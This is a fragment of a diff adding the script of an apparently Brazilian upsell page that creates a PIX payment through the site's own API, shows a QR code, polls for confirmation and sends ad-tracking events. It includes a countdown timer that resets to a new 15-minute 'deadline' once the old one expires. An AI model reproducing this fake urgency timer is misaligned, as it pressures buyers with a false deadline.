+    pollTimer = setInterval(checkOnce, 3000);
+    checkOnce();
+  }
+
+  function resumePending(){
+    try{
+      var prev = localStorage.getItem(STORAGE_KEY);
+      if(prev && !localStorage.getItem('pixPaid_'+prev)){
+        body.innerHTML = '<div class="loading"><span class="spinner"></span> Confirmando pagamento…</div>';
+        open();
+        startPolling(prev);
+      }
+    }catch(e){}
+  }
+  document.addEventListener('visibilitychange', function(){ if(document.visibilityState==='visible'){ if(txId) startPolling(txId); } });
+  window.addEventListener('focus', function(){ if(txId) startPolling(txId); });
+
+  function createPix(){
+    body.innerHTML = '<div class="loading"><span class="spinner"></span> Gerando PIX…</div>';
+    var p = getPerson();
+    if(!p){
+      renderErr('Não encontramos seus dados de compra. Volte ao checkout para continuar.');
+      return;
+    }
+    fetch('/api/public/pix/create', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        amount: AMOUNT,
+        client: {
+          name: p.nome,
+          email: p.email,
+          document: digits(p.cpf),
+          phone: digits(p.telefone)
+        },
+        products: [{ name: PRODUCT, quantity: 1, price: AMOUNT }],
+        shipping: {
+          cep: digits(p.cep || ''),
+          logradouro: p.logradouro || p.rua || '',
+          numero: String(p.numero || ''),
+          complemento: p.complemento || '',
+          bairro: p.bairro || '',
+          cidade: p.cidade || '',
+          uf: p.uf || p.estado || ''
+        },
+        utm: (window.getUTMs ? window.getUTMs() : {}),
+        fb: (window.getFbData ? window.getFbData() : {})
+      })
+    })
+    .then(function(r){ return r.json().then(function(j){ return {ok:r.ok, j:j}; }); })
+    .then(function(res){
+      if(!res.ok || !res.j || !res.j.copyPaste){
+        renderErr(res.j && res.j.error ? res.j.error : 'Falha ao gerar PIX.'); return;
+      }
+      var cp = res.j.copyPaste;
+      var qrSrc = (res.j.qrCode && /^data:image|^https?:/.test(res.j.qrCode))
+        ? res.j.qrCode
+        : 'https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=' + encodeURIComponent(cp);
+      txId = [res.j.transactionId,res.j.gatewayTransactionId].filter(Boolean).filter(function(v,i,a){return a.indexOf(v)===i;}).join(',');
+      orderId = res.j.orderId || res.j.gatewayTransactionId || txId;
+      renderQR(cp, qrSrc);
+      if(txId) startPolling(txId);
+    })
+    .catch(function(){ renderErr('Erro de conexão. Tente novamente.'); });
+  }
+
+  (function(){
+    var el = document.getElementById('cd');
+    if(!el) return;
+    var KEY = 'upsellDeadline_' + location.pathname;
+    var end;
+    try{ end = parseInt(sessionStorage.getItem(KEY)||'0',10); }catch(e){ end = 0; }
+    if(!end || end < Date.now()){ end = Date.now() + 15*60*1000; try{ sessionStorage.setItem(KEY, String(end)); }catch(e){} }
+    function tick(){
+      var s = Math.max(0, Math.floor((end - Date.now())/1000));
+      var m = Math.floor(s/60);
+      el.textContent = (m<10?'0':'')+m+':'+((s%60)<10?'0':'')+(s%60);
+      if(s<=0){ el.textContent = 'expirando…'; clearInterval(t); }
+    }
+    var t = setInterval(tick, 1000); tick();
+  })();
+
+  document.getElementById('cta-pay').addEventListener('click', function(){
+    try{ if(typeof fbq==='function') fbq('track','InitiateCheckout',{value:AMOUNT,currency:'BRL'}); if(window.lvTtInitiateCheckout) window.lvTtInitiateCheckout(AMOUNT); }catch(e){}
+    open();
+    createPix();
+  });
+
+  // resumePending(); // disabled: don't auto-open modal on load
+})();
+</script>
+<script src="/js/tiktok-pixel.js"></script><script src="/js/utm.js"></script><script src="/js/support-widget.js" defer></script></body>
+</html>
